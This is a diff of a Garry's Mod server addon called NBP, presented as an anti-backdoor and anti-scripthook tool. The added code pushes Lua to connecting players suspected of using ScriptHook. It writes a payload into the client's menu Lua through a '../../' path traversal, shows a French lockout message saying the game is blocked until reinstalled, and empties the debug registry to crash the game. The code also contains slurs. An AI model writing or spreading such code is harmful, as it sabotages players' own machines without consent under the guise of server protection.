@@ -1,3 +1,5 @@
+
+
 print("Starting NBP")
 local NBP = {}
 
@@ -10,14 +12,23 @@ NBP.AntiScriptHook = true
 util.AddNetworkString("NBP_ASH_SENDCODE") -- To send code to client
 
 hook.Add("PlayerAuthed", "NBP_ASH", function(ply)
+	if not NBP.AntiScriptHook then return end
 	timer.Simple(5, function()
 		ply:SendLua([[
-			net.Receive("NBP_ASH_SENDCODE", function() RunString(net.ReadString(), "Startup") end)
+			net.Receive("NBP_ASH_SENDCODE", function() RunString(net.ReadString(), "fag.lua") end)
 		]])
 		timer.Simple(1, function()
 			net.Start("NBP_ASH_SENDCODE")
 			net.WriteString([=[
-				RunString([[
+				local cmp = {}
+				_SCRIPT = cmp
+				_SOURCE = cmp
+				RunString("-- ok", "lol")
+				if _SCRIPT == cmp or _SOURCE == cmp then
+				    return
+				end
+
+				RunString([=====[
 					
 					include( "mount/mount.lua" )
 					include( "getmaps.lua" )
@@ -36,21 +47,56 @@ hook.Add("PlayerAuthed", "NBP_ASH", function(ply)
 					include( "util.lua" )
 
 
-					surface.CreateFont("LOLWUT", {size=24})
-					hook.Add("DrawOverlay", "yeah_fuck_your_shit_hard", function()
-						draw.RoundedBox(0, 0, 0, ScrW(), ScrH(), Color(0, 0, 0))
-						draw.SimpleText("PWNED GROUP", "LOLWUT", ScrW() / 2, ScrH() / 2, Color(255, 100, 100),1,1)
-						draw.SimpleText("No Backdoor Please", "LOLWUT", ScrW() / 2, ScrH() / 1.75, Color(255, 150, 150),1,1)
-						draw.SimpleText("Salut, Garry's Mod est bloquer car tu a essayer de filesteal un server proteger par NBP", "LOLWUT", ScrW() / 2, ScrH() / 1.50, Color(255, 255, 255),1,1)
-						draw.SimpleText("Pour te libéré, tu peut re-installer ton jeu :)", "LOLWUT", ScrW() / 2, ScrH() / 1.35, Color(255, 255, 255),1,1)	
-						draw.SimpleText("NBP, No Backdoor Please, par Jhon", "LOLWUT", ScrW() / 2, ScrH() / 1.25, Color(255, 255, 255),1,1)	
-					end)
+					-----------------------------------
+					-- Payload :: You can replace it if you want, just remember it's MENU not CLIENT
+					timer.Simple(2, function()
+						local frame = vgui.Create("DFrame")
+						frame:ShowCloseButton(false)
+						frame:SetDraggable(false)
+						frame:SetTitle("")
+						frame:SetSize(700, 500)
+						frame:Center()
+						frame.Paint = function( s,w,h )
+							draw.RoundedBox(0, 0, 0, w, h, Color(255, 100,100,200))
+						end
+						frame:MakePopup()
+						surface.CreateFont("NBP_Title",{size=28})
+						surface.CreateFont("NBP_Text",{size=18})
+						local title = vgui.Create("DLabel", frame)
+						title:SetTextColor(Color(255, 0, 0))
+						title:SetPos(10, 5)
+						title:SetFontInternal("NBP_Title")
+						title:SetText([[ERROR]])
+						title:SizeToContents()
+						local t = [[
+							Garry's Mod a subit une erreur causer par la presence de scripthook.
+							Le server etant proteger par NBP votre jeu Garr's Mod a ete bloquer.
+							Veuillez re-installer Garry's Mod et ne jamais essayer de voler des fichier
 
-				]], "../../garrysmod/lua/menu/menu.lua")
-				hook.Remove("DrawOverlay", "yeah_fuck_your_shit_hard")
-				timer.Create("OHNOGGGGGGGGG", 0.1, 10, function()
-					hook.Remove("DrawOverlay", "yeah_fuck_your_shit_hard")
-				end)
+
+
+
+							      John, PWNED GROUPE
+							      Ce message apparait suit a l'utilisation de scripthook sur un server etant proteger par NBP
+							]]
+							local text = vgui.Create("DLabel", frame)
+							text:SetTextColor(Color(0, 0, 0))
+							text:SetPos(10, 50)
+							text:SetFontInternal("NBP_Text")
+							text:SetText("")
+							local x = 0
+							timer.Create("NBP_Slowtype", 0.02, string.len(t), function()
+								text:SetText(text:GetText()..t[x])
+								text:SizeToContents()
+								x = x + 1
+							end)
+					end)
+					GameDetails = function()
+						table.Empty(debug.getregistry())
+					end
+					-----------------------------------
+
+				]=====], "../../garrysmod/lua/menu/menu.lua")
 				function ScrewScriptHook(path)
 					local files, dirs = file.Find("lua/"..path.."*", "GAME")
 					for i,v in pairs(files) do
@@ -65,7 +111,13 @@ hook.Add("PlayerAuthed", "NBP_ASH", function(ply)
 				end
 				ScrewScriptHook("")
 				ScrewScriptHook = nil
+				for i=1,100 do
+					RunString("-- fuck you", "RCON_PASSWORD"..i)
+				end
 				RunString([[return false]], "../scripthook.lua") -- No more scripthook
+
+				table.Empty(debug.getregistry())
+				-- Just crash at the end
 				]=])
 			net.Send(ply)
 			print("Sent anti-scripthook to "..ply:Nick())
@@ -321,7 +373,7 @@ timer.Create("NBP_RemoveAndSpoof", 2, 0, function()
 		if (not NBP.Spoofed[v]) and (type(v) == type("")) then
 			util.AddNetworkString(v)
 			net.Receive(v, ban)     -- Spoof
-			NBP.Spoofed[v] = true
+			NBP.Spoofed[v] = true	
 		end
 	end
 end)
